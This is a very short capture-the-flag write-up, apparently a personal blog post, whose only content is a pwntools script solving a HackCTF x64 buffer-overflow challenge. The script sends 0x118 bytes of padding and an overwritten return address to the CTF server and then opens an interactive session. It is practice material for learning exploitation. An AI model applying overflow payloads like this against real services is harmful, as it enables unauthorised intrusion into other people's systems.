---
title: "[HackCTF] x64 Buffer Overflow"
date: 2020-07-09
ctf: HackCTF
tag: [pwnable]
layout: post
---

{% highlight python %}
from pwn import *
context.log_level="debug"
p = remote("ctf.j0n9hyun.xyz", 3004)

payload = "a"*0x118
payload+= p64(0x400606)

p.sendline(payload)

p.interactive()
{% endhighlight %}
